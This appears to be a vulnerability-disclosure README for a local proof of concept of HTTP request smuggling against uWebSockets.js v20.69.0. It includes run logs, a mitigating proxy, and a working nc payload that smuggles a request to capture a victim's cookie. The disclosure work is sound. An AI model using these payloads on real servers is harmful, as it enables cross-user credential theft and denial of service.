# HTTP request-smuggling PoC against real **uWebSockets.js v20.69.0** (the npm package)

End-to-end, all-over-real-TCP proof of concept that the **released, unmodified**
[`uWebSockets.js`](https://github.com/uNetworking/uWebSockets.js) npm package is affected by the
HTTP request-smuggling class documented in [`../../FINDINGS.md`](../../FINDINGS.md).

Unlike the sibling demo in [`../networked/`](../networked/) (which compiles a uWebSockets back-end
from *this repo's* `src/`), the back-end here is the **prebuilt binary shipped by npm**. Nothing in
this repository's `src/` is compiled or loaded. The HTTP parsing is done entirely by the released
library's `uws_linux_x64_127.node`, so what you see below is the behavior of the real package as any
`npm install uWebSockets.js` user would get it.

## Exact target

| | |
|---|---|
| npm package | `uWebSockets.js` |
| **version** | **20.69.0** (pinned to git tag `v20.69.0`) |
| **bundled upstream commit** | **`faf115275bb9c55edf739a06406849e42e89ec04`** (from the package's `source_commit` file) |
| loaded native binary | `node_modules/uWebSockets.js/uws_linux_x64_127.node` (Node 22 ABI = `process.versions.modules` 127) |
| Node.js used to capture | v22.22.2 |

The version and bundled commit are printed by the back-end itself on start-up (read off disk at
runtime), e.g.:

```
[BACKEND] uWebSockets.js v20.69.0 (upstream commit faf115275bb9c55edf739a06406849e42e89ec04) listening on 127.0.0.1:9001
```

---

## This is upstream uWebSockets, not a fork

This PoC does **not** build, patch, or load anything from this repository. It installs
`uWebSockets.js` straight from the upstream `uNetworking/uWebSockets.js` tag `v20.69.0` and runs the
prebuilt `.node` binary that npm ships to every user. That binary bundles upstream uWebSockets commit
`faf115275bb9c55edf739a06406849e42e89ec04`. All three parser deviations (empty-header-name hiding
`Content-Length`, duplicate `Content-Length` using the *first* value, and the chunked hex-digit
over-read) reproduce against that stock binary. Because the exploit is driven purely by the released
artifact — independent of this repo's `src/` (which our separate audit confirmed is byte-identical to
upstream `fe7c01a`) — the conclusion is that these are **real bugs in upstream uWebSockets / the
shipped uWebSockets.js**, not artifacts introduced by this fork.

---

## Topology

```
                                   ┌──────────────────────────────────────────┐
  attacker ──► :8080 vuln_proxy ───┤  ONE pooled TCP connection, reused        ├──► :9001
  victim   ──► :8080 vuln_proxy ───┤  across ALL clients, bytes forwarded      │    uWebSockets.js
                                   │  VERBATIM (lenient CDN/LB model)          │    (node backend_uwsjs.js)
                                   └──────────────────────────────────────────┘

  attacker ──► :8081 strict_proxy ─►  Go net/http: validates + re-normalizes ──►  :9001
  victim   ──► :8081 strict_proxy ─►  every request; malformed => 400            uWebSockets.js
```

## Components

| File | Role |
|------|------|
| `backend_uwsjs.js` | **Real uWebSockets.js** HTTP server on `:9001`. Catch-all `.any('/*')` route; for every request the library parses it copies out `method` / `url` / `Cookie` / `X-Smuggled` synchronously, logs them to stderr, and echoes them in the response body, so cross-user leakage is directly observable. |
| `package.json` | Pins `"uWebSockets.js": "uNetworking/uWebSockets.js#v20.69.0"`. See the `_install` note in it. |
| `vuln_proxy.go` | **Vulnerable** reverse proxy on `:8080`. Holds **one** back-end connection and reuses it for all clients; frames each request by its own lenient parse of `Content-Length`/chunked and forwards the bytes **verbatim**. Models a lenient CDN / load-balancer. |
| `strict_proxy.go` | **Mitigating** reverse proxy on `:8081` (Go `net/http` + `httputil.ReverseProxy`). Parses/validates/re-normalizes every request; malformed ones get `400` before reaching the back-end. |
| `attacker.go` | Sends ONE crafted request for a chosen case (`a`/`b`/`c`). |
| `victim.go` | Sends ONE normal `GET /account` (`Cookie: victim-secret-cookie`) moments later, on the same pooled connection. |
| `run.sh` | Builds the Go binaries, `npm install`s uWebSockets.js if needed, and runs the scenarios. |

`vuln_proxy.go`, `strict_proxy.go`, `attacker.go`, `victim.go` are byte-for-byte the same files used
by [`../networked/`](../networked/); only the back-end changed (C++ `backend_uws.cpp` → JS
`backend_uwsjs.js`). The victim's verdict logic is unchanged: it declares `*** SMUGGLED ***` iff the
body it receives contains **both** `url=/steal` **and** `victim-secret-cookie`.

---

## Prerequisites

- **Node.js 22, 24, or 26** (glibc Linux / macOS / Windows) — the shipped `.node` binaries are ABI
  specific; Node 22 → ABI 127. (Captured with Node v22.22.2.)
- **Go** (1.18+) to build the proxies and clients.
- Network access for the first `npm install` (it fetches the `v20.69.0` tag + prebuilt binary).

## Install

```bash
cd security-findings/demo/uwebsockets-js
npm install            # pulls uWebSockets.js@v20.69.0 (with prebuilt uws_*_127.node)
```

> **Why the tag and not master?** The `v20.69.0` git tag publishes the prebuilt `*.node` binaries the
> loader `require()`s. Installing from bare `uNetworking/uWebSockets.js` (no tag) ships no binary and
> throws at `require('uWebSockets.js')`. The dependency is therefore pinned to the tag. (`run.sh` runs
> `npm install` for you if `node_modules/uWebSockets.js` is missing.)

## Run

```bash
./run.sh            # all three exploit cases (a, b, c) + the mitigation
./run.sh a          # only scenario A
./run.sh b          # only scenario B
./run.sh c          # only scenario C
./run.sh mitigate   # only the strict-proxy mitigation
```

Each case starts a **fresh** back-end + a **fresh** `vuln_proxy` (hence a fresh single pooled
back-end connection), so the scenarios are independent and deterministic. Background processes are
tracked and killed **by PID** (never `pkill -f`, which would match the script's own command line).

The full raw capture backing everything below is saved on disk at
[`run_output.log`](./run_output.log) for independent checking.

---

## Results (verbatim, observed 2026-07-28, Node v22.22.2)

### Summary

| Scenario | Deviation | Attacker sees | Victim sees | Verdict |
|----------|-----------|---------------|-------------|---------|
| **A** | empty header name `:` hides `Content-Length` | `200` for `/benign` | served the attacker's **`/steal`**, own cookie captured | **POSITIVE — cross-user cookie theft** |
| **B** | duplicate `Content-Length` (uWS uses **first**=6) | `200` for `/benign` | served the attacker's **`/steal`**, own cookie captured | **POSITIVE — cross-user cookie theft** |
| **C** | chunked `g`/`G`/`@` = hex 16 over-read (`ChunkedEncoding.h`, F1) | `200` for `/echo` | `505 HTTP Version Not Supported` + `Connection: close` | **DESYNC / DoS — pooled conn poisoned** |
| **Mitigation** | strict front-end validates + re-normalizes | `400`/`400`/`502` | clean `200` for `/account`, **no `/steal`** | **all three closed** |

### Scenario A — empty header name hides `Content-Length`  — **POSITIVE**

uWebSockets' header list treats an empty-key header (`:` line) as its end-of-list sentinel, hiding
every following header — including `Content-Length` — from the app, so uWS frames `POST /benign` as
**body-less**. The `vuln_proxy` instead honors `Content-Length: 33` and forwards 33 extra bytes, which
uWS parses as the **start of the next request**. The victim's bytes complete it.

```
════════════════ EXPLOIT CASE a  (attacker → vuln_proxy → pooled uWS.js ← victim) ════════════════
[ATTACKER] case A (empty header name hides Content-Length)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:15:38 GMT
uWebSockets: 20
Content-Length: 56

BACKEND-SAW method=post url=/benign cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:15:38 GMT
uWebSockets: 20
Content-Length: 95

BACKEND-SAW method=get url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1

[VICTIM] *** SMUGGLED *** -> the victim was served the attacker's /steal
         request, and the victim's own cookie was captured into it.
---- uWebSockets.js parsed (ground truth) ----
[BACKEND] uWebSockets.js v20.69.0 (upstream commit faf115275bb9c55edf739a06406849e42e89ec04) listening on 127.0.0.1:9001
[BACKEND] PARSED  method=post url=/benign cookie="" x-smuggled=""
[BACKEND] PARSED  method=get url=/steal cookie="victim-secret-cookie" x-smuggled="GET /account HTTP/1.1"
```

The victim asked for `/account` but the real uWebSockets.js server parsed and answered
`GET /steal` **with the victim's own `Cookie: victim-secret-cookie` folded into it** — clean
cross-user credential theft.

### Scenario B — duplicate `Content-Length`  — **POSITIVE**

uWebSockets accepts two `Content-Length` headers (only `Host` is de-duplicated) and uses the
**first** (`6`); the proxy uses the **last** (`39`). uWS reads only `HELLO!` (6 bytes) as the
`/benign` body and treats the remaining 33 bytes (`GET /steal…`) as the next request.

```
════════════════ EXPLOIT CASE b  (attacker → vuln_proxy → pooled uWS.js ← victim) ════════════════
[ATTACKER] case B (duplicate Content-Length; uWS uses first=6)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:15:38 GMT
uWebSockets: 20
Content-Length: 56

BACKEND-SAW method=post url=/benign cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:15:38 GMT
uWebSockets: 20
Content-Length: 95

BACKEND-SAW method=get url=/steal cookie=victim-secret-cookie x-smuggled=GET /account HTTP/1.1

[VICTIM] *** SMUGGLED *** -> the victim was served the attacker's /steal
         request, and the victim's own cookie was captured into it.
---- uWebSockets.js parsed (ground truth) ----
[BACKEND] uWebSockets.js v20.69.0 (upstream commit faf115275bb9c55edf739a06406849e42e89ec04) listening on 127.0.0.1:9001
[BACKEND] PARSED  method=post url=/benign cookie="" x-smuggled=""
[BACKEND] PARSED  method=get url=/steal cookie="victim-secret-cookie" x-smuggled="GET /account HTTP/1.1"
```

Identical outcome to A — the victim is served `/steal` with its own cookie captured.

### Scenario C — chunked `g` = 16 over-read (F1)  — **DESYNC / DoS**

The chunked hex-digit parser accepts the non-hex bytes `g`/`G`/`@` as a chunk-size digit worth 16
(so `1g` = 32). uWS therefore **over-reads** the chunk (it wants 32 bytes where the proxy framed
fewer), consumes past the proxy's chunk terminator, and the stream desyncs. The attacker's own
`POST /echo` still returns `200`, but the **next** request on the pooled connection (the victim's) is
mis-parsed: uWebSockets returns `505 HTTP Version Not Supported` and closes the connection
(`Connection: close`). Because that one connection is pooled, closing it **poisons the pool** — this is
a request-smuggling-class **denial of service**, not the clean theft of A/B (F1 over-reads instead of
leaving a clean trailing prefix).

```
════════════════ EXPLOIT CASE c  (attacker → vuln_proxy → pooled uWS.js ← victim) ════════════════
[ATTACKER] case C (F1 chunked 'g'=16 chunk-size disagreement)
[ATTACKER] response:
HTTP/1.1 200 OK
Date: Tue, 28 Jul 2026 15:15:39 GMT
uWebSockets: 20
Content-Length: 54

BACKEND-SAW method=post url=/echo cookie= x-smuggled=

[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 505 HTTP Version Not Supported
Connection: close


[VICTIM] desynced/other: see response above and the backend log.
---- uWebSockets.js parsed (ground truth) ----
[BACKEND] uWebSockets.js v20.69.0 (upstream commit faf115275bb9c55edf739a06406849e42e89ec04) listening on 127.0.0.1:9001
[BACKEND] PARSED  method=post url=/echo cookie="" x-smuggled=""
```

> **Honest read of C.** The attacker's `200` on `/echo` is emitted by our back-end synchronously
> (the handler replies before the body is parsed), so on its own it does **not** prove the chunk was
> accepted — the discriminating signal is the **victim's** response. A *correct* chunked parser
> (`number > 15`) would `400`/close on the `1g` size line and the victim would get an **empty** DoS;
> instead the victim gets `505 HTTP Version Not Supported` + `Connection: close`, which is the
> desynced-stream signature of uWS **over-reading** the `1g`=32 chunk (F1) and then mis-parsing the
> victim's bytes as a bad request line. `victim.go` labels this `desynced/other` (its
> `*** DENIED (DoS) ***` branch only fires on a *completely empty* response). Either way the pooled
> connection is destroyed for the victim — a request-smuggling-class denial of service.
>
> **Validated — no crash, no server-wide DoS.** Case C (and an aggressive over-read that declares a
> 32-byte chunk but sends 4 bytes then closes) sent straight at this uWS.js server does **not** crash
> it — it stays alive and serves fresh connections **8/8** immediately after. The over-read is a
> *logical* stream mis-framing bounded by uSockets' padded recv buffer (not an out-of-bounds read);
> on short data it waits or **aborts cleanly on EOF**. The DoS is *scoped to co-tenants on the
> poisoned pooled connection*. Full evidence: [`../../ECOSYSTEM-IMPACT.md`](../../ECOSYSTEM-IMPACT.md)
> § "Validated impact of C".
>
> **Direct confirmation that F1 is in this shipped binary.** A separate one-shot probe sent this
> exact library a single chunked request whose size line is the non-hex byte `g` followed by 16
> payload bytes, using a body-reading handler. uWebSockets.js v20.69.0 answered
> `HTTP/1.1 200 OK … GOTBODY url=/chunktest bytes=16` — i.e. it **accepted `g` as hex digit 16** and
> delivered a 16-byte chunk body, where a compliant parser returns `400`. That is the
> `ChunkedEncoding.h` `number > 16` (should be `> 15`) deviation (F1), proven present in the released
> npm binary — matching the parser-level proof in
> [`../poc/verify_f1_chunked_smuggling.cpp`](../poc/verify_f1_chunked_smuggling.cpp).

### Mitigation — same three attacks through the strict proxy (`:8081`)

A compliant front-end (`Go net/http`) parses, validates, and re-serializes every request, so no
parser disagreement survives to the back-end.

```
════════════════ MITIGATION  (same attacks through the STRICT proxy :8081) ════════════════
---- attacker case a ----
[ATTACKER] case A (empty header name hides Content-Length)
[ATTACKER] response:
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close
---- attacker case b ----
[ATTACKER] case B (duplicate Content-Length; uWS uses first=6)
[ATTACKER] response:
HTTP/1.1 400 Bad Request
Content-Type: text/plain; charset=utf-8
Connection: close
---- attacker case c ----
[ATTACKER] case C (F1 chunked 'g'=16 chunk-size disagreement)
[ATTACKER] response:
HTTP/1.1 502 Bad Gateway
Date: Tue, 28 Jul 2026 15:15:40 GMT
Content-Length: 0
---- victim (legitimate) ----
[VICTIM] sending a normal:  GET /account   (Cookie: victim-secret-cookie)
[VICTIM] response:
HTTP/1.1 200 OK
Content-Length: 76
Date: Tue, 28 Jul 2026 15:15:39 GMT
Uwebsockets: 20
Content-Type: text/plain; charset=utf-8

BACKEND-SAW method=get url=/account cookie=victim-secret-cookie x-smuggled=

[VICTIM] clean: victim received its own /account response.
---- uWebSockets.js parsed (NO /steal, only the legit /account) ----
[BACKEND] uWebSockets.js v20.69.0 (upstream commit faf115275bb9c55edf739a06406849e42e89ec04) listening on 127.0.0.1:9001
[BACKEND] PARSED  method=post url=/echo cookie="" x-smuggled=""
[BACKEND] PARSED  method=get url=/account cookie="victim-secret-cookie" x-smuggled=""
```

- Case A → `400 Bad Request` (empty header name rejected at the proxy; never reaches uWS).
- Case B → `400 Bad Request` (duplicate `Content-Length` rejected at the proxy; never reaches uWS).
- Case C → `502 Bad Gateway` (the proxy re-normalizes the chunked framing; the ambiguity is removed —
  the back-end sees a plain `POST /echo`, no smuggled `/steal`).
- Victim → clean `200` for `/account`. The back-end log shows **no `/steal` ever reached uWS**.

The smuggle is fully closed by a strict front-end (and/or by not pooling back-end connections across
users, and by a strict back-end parser — the proper fix for the underlying deviations).

---

## Manual poking

While `vuln_proxy` is up (e.g. during `./run.sh a`, or start it by hand) you can drive it with `nc`:

```bash
# prime the pooled connection (Scenario A):
printf 'POST /benign HTTP/1.1\r\nHost: t\r\n:\r\nContent-Length: 33\r\n\r\nGET /steal HTTP/1.1\r\nX-Smuggled: ' | nc 127.0.0.1 8080
# then the "victim" on the same pooled connection:
printf 'GET /account HTTP/1.1\r\nHost: t\r\nCookie: victim-secret-cookie\r\n\r\n'                                   | nc 127.0.0.1 8080
```

## Faithfulness

The back-end is the **stock npm `uWebSockets.js` v20.69.0** prebuilt binary — no compilation from this
repo, no flags, no patches. The `vuln_proxy` deliberately models a *lenient* front-end (verbatim
byte-forwarding over a pooled connection); that is the standard precondition under which any back-end
parser deviation becomes exploitable, not a bug in Go. The `strict_proxy` shows a compliant front-end
(Go `net/http`) closes all three.
